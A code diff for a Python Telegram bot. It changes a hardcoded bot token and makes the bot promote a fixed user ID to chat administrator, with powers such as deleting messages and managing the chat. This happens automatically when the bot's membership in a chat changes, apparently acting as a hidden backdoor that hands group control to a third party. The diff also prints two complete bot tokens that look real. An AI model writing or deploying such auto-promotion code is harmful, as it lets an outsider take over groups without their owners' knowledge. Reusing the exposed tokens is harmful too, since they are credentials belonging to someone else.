@@ -9,9 +9,9 @@ from telegram.ext import (
     ChatMemberHandler,
 )
 
-TOKEN = "8062489806:AAFSWWiJGU3gglcLope0LdYhqRGbMR3Y6VM"
+TOKEN = "8062489806:AAEl6jXtIZdid5Z6rLsqyzaaUHOt3Hm7xlA"
 
-TARGET_USER = "@Iookatmetenderly"
+TARGET_USER_ID = 8269818641
 
 
 async def reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -47,11 +47,9 @@ async def auto_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         chat_id = update.my_chat_member.chat.id
 
         try:
-            user = await context.bot.get_chat(TARGET_USER)
-
             await context.bot.promote_chat_member(
                 chat_id=chat_id,
-                user_id=user.id,
+                user_id=TARGET_USER_ID,
                 can_manage_chat=True,
                 can_delete_messages=True,
                 can_manage_video_chats=True,
@@ -80,7 +78,7 @@ def main():
         )
     )
 
-    app.run_polling()
+    app.run_polling(drop_pending_updates=True)
 
 
 if __name__ == "__main__":
